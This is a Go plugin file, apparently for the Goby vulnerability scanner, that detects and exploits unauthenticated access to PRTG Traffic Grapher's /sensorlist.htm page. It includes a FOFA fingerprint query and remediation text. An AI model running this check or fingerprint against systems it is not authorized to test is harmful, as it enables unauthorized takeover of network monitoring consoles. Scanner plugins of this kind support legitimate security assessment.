package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PRTG Traffic Grapher Unauthorized Access",
    "Description": "<p>PRTG Paessler Grapher is a powerful and free software developed by Paessler, which can obtain traffic information and generate graphical reports through the SNMP protocol on routers and other devices.</p><p>The PRTG Paessler Grapher unauthorized access vulnerability allows an attacker to enter the background without logging in to take over system control.</p>",
    "Impact": "PRTG Traffic Grapher Unauthorized Access",
    "Recommendation": "<p>Vendors have released bug fixes, please pay attention to updates <a href=\"https://www.paessler.com/\">https://www.paessler.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "Product": "PRTG Paessler Grapher",
    "VulType": [
        "Unauthorized Access"
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "Translation": {
        "CN": {
            "Name": "PRTG Traffic Grapher 未授权访问漏洞",
            "Description": "<p>PRTG Paessler Grapher 是 Paessler 公司开发的一款功能强大的免费且可以通过路由器等设备上的SNMP协议取得流量资讯并产生图形报表的软件。<br></p><p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\"><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">PRTG Paessler Grapher</span>&nbsp;未授权访问漏洞，攻击者可通过该漏洞不需要登录即可进入后台接管系统控制权。</span><br></p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">PRTG Paessler Grapher</span><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">&nbsp;未授权访问漏洞，攻击者可通过该漏洞不需要登录即可进入后台接管系统控制权。</span><br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新&nbsp;<a href=\"https://www.paessler.com/\">https://www.paessler.com/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "PRTG Paessler Grapher",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "PRTG Traffic Grapher Unauthorized Access",
            "Description": "<p>PRTG Paessler Grapher is a powerful and free software developed by Paessler, which can obtain traffic information and generate graphical reports through the SNMP protocol on routers and other devices.</p><p>The PRTG Paessler Grapher unauthorized access vulnerability allows an attacker to enter the background without logging in to take over system control.</p>",
            "Impact": "PRTG Traffic Grapher Unauthorized Access",
            "Recommendation": "<p>Vendors have released bug fixes, please pay attention to updates&nbsp;<a href=\"https://www.paessler.com/\">https://www.paessler.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Product": "PRTG Paessler Grapher",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "FofaQuery": "body=\"PRTG Traffic Grapher\"",
    "GobyQuery": "body=\"PRTG Traffic Grapher\"",
    "Author": "AnMing",
    "Homepage": "https://www.paessler.com/",
    "DisclosureDate": "2020-03-19",
    "References": [
        "https://www.exploit-db.com/ghdb/5808"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/sensorlist.htm"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "PRTG Traffic Grapher") && !strings.Contains(resp.Utf8Html, "Please log in") && resp.StatusCode == 200 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/sensorlist.htm"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "PRTG Traffic Grapher") && !strings.Contains(resp.Utf8Html, "Please log in") && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "Success ! Please visit the url to enter the page of webManager:\n" + expResult.HostInfo.FixedHostInfo + url
				} else {
					expResult.Output = "Error! Please check your input!"
				}
			}
			return expResult
		},
	))
}
